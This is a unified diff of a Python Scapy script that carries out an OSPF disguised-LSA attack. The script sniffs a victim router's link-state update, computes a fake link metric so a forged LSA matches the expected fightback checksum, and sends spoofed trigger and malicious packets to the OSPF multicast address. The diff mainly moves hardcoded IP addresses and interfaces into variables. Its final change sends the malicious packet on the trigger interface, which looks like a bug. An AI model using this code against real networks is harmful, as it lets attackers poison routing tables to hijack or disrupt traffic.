@@ -46,6 +46,7 @@ OSPF Link "metric" field, used to fake the checksum.
 """
 
 
+
 def get_fake_metric_value(fightback_lsa, evil_lsa, linkcount):
 	tmp_lsa = evil_lsa[OSPF_Router_LSA].copy()
 	fightback_checksum = ospf_lsa_checksum(fightback_lsa.build())
@@ -60,14 +61,10 @@ def get_fake_metric_value(fightback_lsa, evil_lsa, linkcount):
 
 		if tmp_checksum == fightback_checksum:
 			return metric
-
 	return 0
 
 
 if __name__ == '__main__':
-	"""
-    Load the Scapy's OSPF module
-    """
 	load_contrib("ospf")
 
 	#####################################################
@@ -78,9 +75,12 @@ if __name__ == '__main__':
 	The router-id of the victim router
 	"""
 	victim = "192.168.35.105"
+	trigger_send_ip = "192.168.12.79"
+	trigger_send_if = 'eth1'
+	disguised_send_ip = "192.168.16.130"
+	disguised_send_if = 'eth0'
 
 	print("[+] Staring sniffing for LSUpdate from the victim's router...")
-
 	#####################################################
 	# Sniffing for the original package					#
 	#####################################################
@@ -89,7 +89,6 @@ if __name__ == '__main__':
 	"""
 	pkts = sniff(filter="proto ospf", stop_filter=lambda x: check_incoming_packet(victim, x))
 
-	# pkts[-1].show()
 
 	"""
 	Get the last packet and copy it.
@@ -128,7 +127,6 @@ if __name__ == '__main__':
 	Addition of the triggering OSPF Link in the trigger packet.
 	"""
 	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(trigger_link)
-
 	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
 	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = \
 		len(pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)
@@ -140,7 +138,7 @@ if __name__ == '__main__':
 	"""
 	# pkt_trig[Ether].src = "00:16:3e:0b:16:1e"
 	# pkt_trig[Ether].dst = "01:00:5e:00:00:05"	# The multicast MAC address
-	pkt_trig[IP].src = "192.168.12.79"
+	pkt_trig[IP].src = trigger_send_ip
 	pkt_trig[IP].dst = "224.0.0.5"
 	pkt_trig[IP].chksum = None
 	pkt_trig[IP].len = None
@@ -232,7 +230,7 @@ if __name__ == '__main__':
 	"""
 	# pkt_evil[Ether].src = "00:16:3e:3a:a7:11"
 	# pkt_evil[Ether].dst = "01:00:5e:00:00:05"
-	pkt_evil[IP].src = "192.168.16.130"
+	pkt_evil[IP].src = disguised_send_ip
 	pkt_evil[IP].dst = "224.0.0.5"
 	pkt_evil[IP].chksum = None
 	pkt_evil[IP].len = None
@@ -243,8 +241,8 @@ if __name__ == '__main__':
 	"""
 	Send trigger packet to trigger the fightback mechanism
 	"""
-	sendp(pkt_trig, iface='eth1')
+	sendp(pkt_trig, iface=trigger_send_if)
 	# sendp(pkt_trig, iface='eth0')
 	sleep(2)
-	sendp(pkt_evil, iface='eth0')
+	sendp(pkt_evil, iface=trigger_send_if)
 
